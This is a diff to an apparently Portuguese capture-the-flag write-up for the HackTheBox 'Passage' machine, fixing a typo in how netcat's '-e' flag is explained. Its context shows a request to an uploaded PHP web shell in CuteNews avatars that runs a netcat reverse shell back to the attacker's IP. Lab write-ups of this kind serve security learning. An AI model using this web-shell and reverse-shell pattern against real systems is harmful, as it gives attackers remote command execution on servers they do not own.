@@ -160,7 +160,7 @@ Agora vamos enviar a conexão com o netcat
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=/bin/nc 10.10.14.238 1337 -e /bin/bash
 
-_-e: exec 'command'
+-e: exec 'command'
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ![Image](https://i.imgur.com/FswUPdW.png)
